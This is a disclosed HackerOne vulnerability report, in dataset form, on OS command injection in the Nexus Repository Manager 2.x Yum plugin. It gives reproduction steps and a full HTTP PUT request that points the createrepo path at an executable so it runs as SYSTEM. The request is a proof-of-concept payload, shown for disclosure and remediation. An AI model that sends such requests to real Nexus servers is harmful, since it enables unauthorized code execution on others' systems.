---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '654888'
original_report_id: '654888'
title: OS Command Injection in Nexus Repository Manager 2.x
weakness: OS Command Injection
team_handle: central-security-project
created_at: '2019-07-23T13:53:43.592Z'
disclosed_at: '2019-08-20T19:55:59.714Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 27
asset_identifier: Java Component in search.maven.org
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- os-command-injection
---

# OS Command Injection in Nexus Repository Manager 2.x

## Metadata

- HackerOne Report ID: 654888
- Weakness: OS Command Injection
- Program: central-security-project
- Disclosed At: 2019-08-20T19:55:59.714Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

# Maven artifact
**groupId:** org.sonatype.nexus.plugins
**artifactId:** nexus-yum-repository-plugin
**version:** 2.14.9-01

# Vulnerability
## Vulnerability Description
The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability. 

## Additional Details
**Source File and Line Number:** https://github.com/sonatype/nexus-public/blob/release-2.14.9-01/plugins/yum/nexus-yum-repository-plugin/src/main/java/org/sonatype/nexus/yum/internal/capabilities/YumCapability.java#L121

## Steps To Reproduce:
1. Navigate to "Capabilities" in Nexus Repository Manager.
2. Edit or create a new Yum: Configuration capability
3. Set path of "createrepo" or "mergerepo" to an OS command (e.g. C:\Windows\System32\calc.exe)
4. The OS command should now have executed as the SYSTEM user. Note that in this case, Nexus appends --version to the OS command.

The following HTTP request was used to trigger the vulnerability:
```
PUT /nexus/service/siesta/capabilities/000013ea3743a556 HTTP/1.1
Host: HOST:PORT
Accept: application/json
Authorization: Basic YWRtaW46YWRtaW4xMjM=
Content-Type: application/xml
Content-Length: 333
Connection: close

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<ns2:capability xmlns:ns2="http://sonatype.org/xsd/nexus-capabilities-plugin/rest/1.0"><id>healthcheck</id><notes>123</notes><enabled>true</enabled><typeId>1</typeId><properties><key>createrepoPath</key><value>C:\Windows\System32\calc.exe</value></properties></ns2:capability>
```
## Supporting Material/References:
- Windows Server 2016
- Sonatype Nexus Repository Manager 2.14.9-01
- Java 8

# Wrap up
- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
